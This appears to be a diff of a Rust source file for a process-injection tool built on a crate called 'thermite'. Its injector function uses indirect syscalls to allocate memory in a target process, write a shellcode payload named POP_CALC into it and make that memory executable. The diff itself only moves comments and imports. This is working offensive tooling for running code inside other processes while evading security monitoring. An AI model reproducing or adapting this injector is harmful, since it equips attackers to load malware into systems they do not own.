@@ -1,10 +1,10 @@
 use std::ffi::c_void;
-use std::mem;
 use std::ptr::null;
 
 use thermite::{debug, info};
 use thermite::indirect_syscall as syscall;
 use thermite::models::windows::*;
+use thermite::models::windows::system_info::ClientId;
 
 // use thermite::models::windows::nt_status::NtStatus;
 
@@ -93,8 +93,8 @@ fn injector(pid: Option<u32>) {
         0u32,                     // [in]      PULONG ZeroBits,
         &mut buf_size,            // [in, out] PSIZE_T   RegionSize,
         MEM_COMMIT | MEM_RESERVE, // [in]      ULONG     AllocationType,
-        PAGE_READWRITE);
-	// [in]      ULONG     Protect
+        PAGE_READWRITE);          // [in]      ULONG     Protect
+	
 	info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);
 
 	// Copy the shellcode to newly allocated memory
@@ -104,8 +104,8 @@ fn injector(pid: Option<u32>) {
         base_addr,          // [in]            PVOID  *BaseAddress,
         &POP_CALC,          // [in]            PVOID  buffer,
         buf_size,           // [in]            ULONG  NumberOfBytesToWrite,
-        &mut bytes_written);
-	// [out, optional] PULONG NumberOfBytesWritten ,
+        &mut bytes_written);// [out, optional] PULONG NumberOfBytesWritten ,
+
 	info!("Successfully written {} bytes in target process' memory", buf_size);
 
 	// Change protection status of allocated memory to READ+EXECUTE
